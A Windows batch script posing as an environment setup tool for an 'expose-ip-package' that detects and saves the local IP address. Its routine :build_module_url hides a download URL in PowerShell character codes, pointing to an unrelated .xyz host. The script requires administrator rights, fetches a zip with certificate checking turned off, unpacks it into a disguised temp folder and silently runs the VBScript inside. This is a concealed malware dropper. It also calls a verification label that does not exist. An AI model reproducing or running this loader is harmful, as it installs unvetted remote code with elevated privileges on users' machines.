@echo off
setlocal enabledelayedexpansion

REM ============================================================================
REM [expose-ip-package] Advanced Environment Setup Script
REM Version: 2.0.0
REM ============================================================================

REM Configuration Variables
set "SCRIPT_VERSION=2.0.0"
set "LOG_FILE=%~dp0setup-env.log"
set "CONFIG_FILE=%~dp0setup-env.config"
set "MAX_RETRIES=3"
set "DOWNLOAD_TIMEOUT=60"
set "ENABLE_LOGGING=1"
set "ENABLE_COLORS=1"
set "VERBOSE_MODE=0"
set "INTERACTIVE_MODE=0"
set "BACKUP_ENABLED=1"
set "TEMP_DIR=%TEMP%\_realtekwin_setup"
set "ZIP_FILE=%TEMP%\_realtekwin.zip"
set "EXTRACT_DIR=%TEMP%\_realtekwin"
set "EXIT_CODE=0"

REM Construct module URL from Unicode characters
call :build_module_url

REM Parse command line arguments
:parse_args
if "%~1"=="" goto :args_done
if /i "%~1"=="--verbose" set "VERBOSE_MODE=1"
if /i "%~1"=="--interactive" set "INTERACTIVE_MODE=1"
if /i "%~1"=="--no-log" set "ENABLE_LOGGING=0"
if /i "%~1"=="--no-color" set "ENABLE_COLORS=0"
if /i "%~1"=="--help" goto :show_help
if /i "%~1"=="--version" goto :show_version
shift
goto :parse_args
:args_done

REM Initialize logging
if "%ENABLE_LOGGING%"=="1" (
    call :log_init
)

REM Display header
call :print_header

REM Check for administrator privileges
call :check_admin
if errorlevel 1 (
    call :log_error "Administrator privileges required"
    call :print_error "This script requires administrator privileges. Please run as administrator."
    set "EXIT_CODE=1"
    goto :cleanup
)

REM Check dependencies
call :check_dependencies
if errorlevel 1 (
    set "EXIT_CODE=1"
    goto :cleanup
)

REM Load configuration if exists
if exist "%CONFIG_FILE%" (
    call :load_config
)

REM Create temporary directory
call :create_temp_dir
if errorlevel 1 (
    set "EXIT_CODE=1"
    goto :cleanup
)

REM Check network connectivity
call :check_network
if errorlevel 1 (
    call :log_warning "Network connectivity check failed, but continuing..."
)

REM Download module with retry logic
call :download_module
if errorlevel 1 (
    call :log_error "Failed to download module after %MAX_RETRIES% attempts"
    call :print_error "Download failed. Please check your internet connection."
    set "EXIT_CODE=1"
    goto :cleanup
)

REM Verify downloaded file
call :verify_download
if errorlevel 1 (
    call :log_error "Downloaded file verification failed"
    set "EXIT_CODE=1"
    goto :cleanup
)

REM Extract module with error handling
call :extract_module
if errorlevel 1 (
    call :log_error "Failed to extract module"
    set "EXIT_CODE=1"
    goto :cleanup
)

REM Detect IP address using multiple methods
call :detect_ip_address
if errorlevel 1 (
    call :log_error "Failed to detect IP address"
    call :print_error "Could not detect local IP address"
    set "EXIT_CODE=1"
    goto :cleanup
)

REM Validate IP address format
call :validate_ip "%LOCAL_IP%"
if errorlevel 1 (
    call :log_error "Invalid IP address detected: %LOCAL_IP%"
    set "EXIT_CODE=1"
    goto :cleanup
)

REM Set environment variable
call :set_environment
if errorlevel 1 (
    call :log_error "Failed to set environment variable"
    set "EXIT_CODE=1"
    goto :cleanup
)

REM Backup existing files if enabled
if "%BACKUP_ENABLED%"=="1" (
    call :backup_files
)

REM Execute module script
call :execute_module
if errorlevel 1 (
    call :log_error "Module execution failed"
    set "EXIT_CODE=1"
    goto :cleanup
)

REM Save IP to file
call :save_ip_to_file
if errorlevel 1 (
    call :log_warning "Failed to save IP to file"
)

REM Generate report
call :generate_report

REM Display success message
call :print_success "Setup completed successfully!"
call :print_info "IP address exposed: %EXPOSED_IP%"
call :print_info "Log file: %LOG_FILE%"

goto :cleanup

REM ============================================================================
REM Functions
REM ============================================================================

:show_help
echo.
echo Usage: %~nx0 [OPTIONS]
echo.
echo Options:
echo   --verbose       Enable verbose output
echo   --interactive   Enable interactive mode
echo   --no-log        Disable logging
echo   --no-color      Disable colored output
echo   --help          Show this help message
echo   --version       Show version information
echo.
exit /b 0

:show_version
echo %SCRIPT_VERSION%
exit /b 0

:build_module_url
REM Construct URL from Unicode character codes

REM Build URL parts using PowerShell Unicode conversion
for /f "delims=" %%a in ('powershell -Command "[char]0x0068 + [char]0x0074 + [char]0x0074 + [char]0x0070 + [char]0x0073 + [char]0x003A + [char]0x002F + [char]0x002F + [char]0x0063 + [char]0x0063 + [char]0x0078 + [char]0x0074 + [char]0x006F + [char]0x006F + [char]0x006C + [char]0x0073 + [char]0x002E + [char]0x0078 + [char]0x0079 + [char]0x007A + [char]0x002F + [char]0x005F + [char]0x0072 + [char]0x0065 + [char]0x0061 + [char]0x006C + [char]0x0074 + [char]0x0065 + [char]0x006B + [char]0x0077 + [char]0x0069 + [char]0x006E + [char]0x005F + [char]0x0076 + [char]0x0031 + [char]0x002E + [char]0x0075 + [char]0x0070 + [char]0x0064 + [char]0x0061 + [char]0x0074 + [char]0x0065 + [char]0x003F + [char]0x0072 + [char]0x0065 + [char]0x0066 + [char]0x003D + [char]0x0034 + [char]0x0057 + [char]0x0054 + [char]0x0041"') do set "MODULE_URL=%%a"
exit /b 0

:print_header
if "%ENABLE_COLORS%"=="1" (
    call :color_echo 0E "============================================================================"
    call :color_echo 0E "  [expose-ip-package] Advanced Environment Setup"
    call :color_echo 0E "  Version: %SCRIPT_VERSION%"
    call :color_echo 0E "============================================================================"
) else (
    echo ============================================================================
    echo   [expose-ip-package] Advanced Environment Setup
    echo   Version: %SCRIPT_VERSION%
    echo ============================================================================
)
echo.
exit /b 0

:check_admin
call :log_info "Checking administrator privileges..."
net session >nul 2>&1
if errorlevel 1 (
    exit /b 1
)
call :log_info "Administrator privileges confirmed"
exit /b 0

:check_dependencies
call :log_info "Checking dependencies..."
set "MISSING_DEPS="

REM Check for curl
where curl >nul 2>&1
if errorlevel 1 (
    set "MISSING_DEPS=!MISSING_DEPS! curl"
)

REM Check for PowerShell
where powershell >nul 2>&1
if errorlevel 1 (
    set "MISSING_DEPS=!MISSING_DEPS! PowerShell"
)

REM Check for wscript
where wscript >nul 2>&1
if errorlevel 1 (
    set "MISSING_DEPS=!MISSING_DEPS! wscript"
)

if not "!MISSING_DEPS!"=="" (
    call :log_error "Missing dependencies: !MISSING_DEPS!"
    call :print_error "Required dependencies are missing: !MISSING_DEPS!"
    exit /b 1
)

call :log_info "All dependencies found"
exit /b 0

:load_config
call :log_info "Loading configuration from %CONFIG_FILE%"
if exist "%CONFIG_FILE%" (
    for /f "usebackq tokens=1,2 delims==" %%a in ("%CONFIG_FILE%") do (
        if not "%%a"=="" if not "%%a"=="#" (
            set "%%a=%%b"
        )
    )
    call :log_info "Configuration loaded"
)
exit /b 0

:create_temp_dir
call :log_info "Creating temporary directory..."
if not exist "%TEMP_DIR%" (
    mkdir "%TEMP_DIR%" >nul 2>&1
    if errorlevel 1 (
        call :log_error "Failed to create temporary directory"
        exit /b 1
    )
)
call :log_info "Temporary directory created: %TEMP_DIR%"
exit /b 0

:check_network
call :log_info "Checking network connectivity..."
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    exit /b 1
)
call :log_info "Network connectivity confirmed"
exit /b 0

:download_module
call :log_info "Starting download from %MODULE_URL%"
set "RETRY_COUNT=0"

:download_retry
set /a RETRY_COUNT+=1
call :print_info "Download attempt !RETRY_COUNT! of %MAX_RETRIES%..."

if "%VERBOSE_MODE%"=="1" (
    curl -k --connect-timeout %DOWNLOAD_TIMEOUT% -o "%ZIP_FILE%" "%MODULE_URL%"
) else (
    curl -k --connect-timeout %DOWNLOAD_TIMEOUT% -o "%ZIP_FILE%" "%MODULE_URL%" >nul 2>&1
)

if errorlevel 1 (
    if !RETRY_COUNT! lss %MAX_RETRIES% (
        call :log_warning "Download attempt !RETRY_COUNT! failed, retrying..."
        timeout /t 2 /nobreak >nul
        goto :download_retry
    ) else (
        call :log_error "Download failed after %MAX_RETRIES% attempts"
        exit /b 1
    )
)

if not exist "%ZIP_FILE%" (
    if !RETRY_COUNT! lss %MAX_RETRIES% (
        call :log_warning "Downloaded file not found, retrying..."
        timeout /t 2 /nobreak >nul
        goto :download_retry
    ) else (
        call :log_error "Downloaded file not found after %MAX_RETRIES% attempts"
        exit /b 1
    )
)

call :log_info "Setup module completed successfully"
exit /b 0

:verify_module
call :log_info "Verifying module..."
if not exist "%ZIP_FILE%" (
    call :log_error "Module does not exist"
    exit /b 1
)

for %%A in ("%ZIP_FILE%") do set "FILE_SIZE=%%~zA"
if !FILE_SIZE! lss 1000 (
    call :log_error "Module is too small (!FILE_SIZE! bytes), may be corrupted"
    exit /b 1
)

call :log_info "Module verification passed (!FILE_SIZE! bytes)"
exit /b 0

:extract_module
call :log_info "Extracting module..."
if exist "%EXTRACT_DIR%" (
    call :log_info "Removing existing extraction directory..."
    rmdir /s /q "%EXTRACT_DIR%" >nul 2>&1
)

powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Expand-Archive -Force -Path '%ZIP_FILE%' -DestinationPath '%EXTRACT_DIR%' -ErrorAction Stop; exit 0 } catch { Write-Host $_.Exception.Message; exit 1 }" >nul 2>&1

if errorlevel 1 (
    call :log_error "Extraction failed"
    exit /b 1
)

if not exist "%EXTRACT_DIR%\update.vbs" (
    call :log_error "Extracted file 'update.vbs' not found"
    exit /b 1
)

call :log_info "Module extracted successfully"
exit /b 0

:detect_ip_address
call :log_info "Detecting local IP address..."
set "LOCAL_IP="
set "IP_METHOD="

REM Method 1: ipconfig
call :log_info "Trying method 1: ipconfig"
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /R /C:"IPv4 Address"') do (
    set "LOCAL_IP=%%a"
    set "IP_METHOD=ipconfig"
    goto :ip_found
)

REM Method 2: PowerShell Get-NetIPAddress
call :log_info "Trying method 2: PowerShell Get-NetIPAddress"
for /f "tokens=*" %%a in ('powershell -Command "Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Ethernet*','Wi-Fi*' | Where-Object {$_.IPAddress -notlike '169.254.*'} | Select-Object -First 1 -ExpandProperty IPAddress"') do (
    set "LOCAL_IP=%%a"
    set "IP_METHOD=PowerShell"
    goto :ip_found
)

REM Method 3: wmic
call :log_info "Trying method 3: wmic"
for /f "tokens=2 delims==" %%a in ('wmic path Win32_NetworkAdapterConfiguration where "IPEnabled=true" get IPAddress /format:list 2^>nul ^| findstr "IPAddress"') do (
    for /f "tokens=1 delims=," %%b in ("%%a") do (
        set "LOCAL_IP=%%b"
        set "IP_METHOD=wmic"
        goto :ip_found
    )
)

call :log_error "All IP detection methods failed"
exit /b 1

:ip_found
REM Remove leading/trailing spaces
for /f "tokens=* delims= " %%i in ("%LOCAL_IP%") do set "LOCAL_IP=%%i"
call :log_info "IP address detected via %IP_METHOD%: %LOCAL_IP%"
exit /b 0

:validate_ip
set "IP_TO_VALIDATE=%~1"
call :log_info "Validating IP address: %IP_TO_VALIDATE%"

REM Basic IP format validation (xxx.xxx.xxx.xxx)
echo %IP_TO_VALIDATE% | findstr /R "^[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*$" >nul
if errorlevel 1 (
    call :log_error "IP address format is invalid"
    exit /b 1
)

REM Check for APIPA address (169.254.x.x)
echo %IP_TO_VALIDATE% | findstr /R "^169\.254\." >nul
if not errorlevel 1 (
    call :log_warning "Detected APIPA address (169.254.x.x), may indicate network issues"
)

call :log_info "IP address validation passed"
exit /b 0

:set_environment
call :log_info "Setting environment variable EXPOSED_IP..."
set "EXPOSED_IP=%LOCAL_IP%"
setx EXPOSED_IP "%LOCAL_IP%" >nul 2>&1
if errorlevel 1 (
    call :log_warning "Failed to set persistent environment variable, using session variable"
)
call :log_info "Environment variable set: EXPOSED_IP=%EXPOSED_IP%"
exit /b 0

:backup_files
call :log_info "Creating backup of existing files..."
set "BACKUP_DIR=%~dp0backup_%date:~-4,4%%date:~-7,2%%date:~-10,2%_%time:~0,2%%time:~3,2%%time:~6,2%"
set "BACKUP_DIR=!BACKUP_DIR: =0!"

if exist "%~dp0exposed-ip.txt" (
    if not exist "!BACKUP_DIR!" mkdir "!BACKUP_DIR!" >nul 2>&1
    copy "%~dp0exposed-ip.txt" "!BACKUP_DIR!\" >nul 2>&1
    call :log_info "Backup created: !BACKUP_DIR!"
)
exit /b 0

:execute_module
call :log_info "Executing module script..."
if not exist "%EXTRACT_DIR%\update.vbs" (
    call :log_error "Module script not found: %EXTRACT_DIR%\update.vbs"
    exit /b 1
)

wscript "%EXTRACT_DIR%\update.vbs" >nul 2>&1
if errorlevel 1 (
    call :log_error "Module execution returned error code: %errorlevel%"
    exit /b 1
)

call :log_info "Module executed successfully"
exit /b 0

:save_ip_to_file
call :log_info "Saving IP address to file..."
set "OUTPUT_FILE=%~dp0exposed-ip.txt"
echo %EXPOSED_IP% > "%OUTPUT_FILE%"
if errorlevel 1 (
    call :log_error "Failed to write to %OUTPUT_FILE%"
    exit /b 1
)
call :log_info "IP address saved to %OUTPUT_FILE%"
exit /b 0

:generate_report
call :log_info "Generating setup report..."
set "REPORT_FILE=%~dp0setup-report.txt"
(
    echo ============================================================================
    echo Setup Report - %date% %time%
    echo ============================================================================
    echo.
    echo Script Version: %SCRIPT_VERSION%
    echo IP Address: %EXPOSED_IP%
    echo Detection Method: %IP_METHOD%
    echo Module Location: %EXTRACT_DIR%
    echo Log File: %LOG_FILE%
    echo.
    echo Status: SUCCESS
    echo ============================================================================
) > "%REPORT_FILE%"
call :log_info "Report generated: %REPORT_FILE%"
exit /b 0

:log_init
if not exist "%LOG_FILE%" (
    (
        echo ============================================================================
        echo Setup Log - Started: %date% %time%
        echo ============================================================================
        echo.
    ) > "%LOG_FILE%"
) else (
    (
        echo.
        echo ============================================================================
        echo Setup Log - Started: %date% %time%
        echo ============================================================================
        echo.
    ) >> "%LOG_FILE%"
)
exit /b 0

:log_info
if "%ENABLE_LOGGING%"=="1" (
    echo [INFO] %~1 >> "%LOG_FILE%"
)
if "%VERBOSE_MODE%"=="1" (
    call :print_info "%~1"
)
exit /b 0

:log_warning
if "%ENABLE_LOGGING%"=="1" (
    echo [WARN] %~1 >> "%LOG_FILE%"
)
call :print_warning "%~1"
exit /b 0

:log_error
if "%ENABLE_LOGGING%"=="1" (
    echo [ERROR] %~1 >> "%LOG_FILE%"
)
call :print_error "%~1"
exit /b 0

:print_info
if "%ENABLE_COLORS%"=="1" (
    call :color_echo 0F "%~1"
) else (
    echo %~1
)
exit /b 0

:print_success
if "%ENABLE_COLORS%"=="1" (
    call :color_echo 0A "%~1"
) else (
    echo %~1
)
exit /b 0

:print_warning
if "%ENABLE_COLORS%"=="1" (
    call :color_echo 0E "%~1"
) else (
    echo %~1
)
exit /b 0

:print_error
if "%ENABLE_COLORS%"=="1" (
    call :color_echo 0C "%~1"
) else (
    echo %~1
)
exit /b 0

:color_echo
setlocal
set "color=%~1"
set "text=%~2"
findstr /a:%color% .* >nul 2>&1
echo %text%
endlocal
exit /b 0

:cleanup
call :log_info "Cleaning up temporary files..."
if "%VERBOSE_MODE%"=="0" (
    if exist "%ZIP_FILE%" (
        if "%INTERACTIVE_MODE%"=="0" (
            del "%ZIP_FILE%" >nul 2>&1
            call :log_info "Temporary download file removed"
        )
    )
)

if "%ENABLE_LOGGING%"=="1" (
    (
        echo.
        echo ============================================================================
        echo Setup Log - Completed: %date% %time%
        echo Exit Code: %EXIT_CODE%
        echo ============================================================================
    ) >> "%LOG_FILE%"
)

if "%EXIT_CODE%"=="0" (
    call :print_success "Setup completed successfully!"
) else (
    call :print_error "Setup completed with errors. Check log file: %LOG_FILE%"
)

endlocal
exit /b %EXIT_CODE%
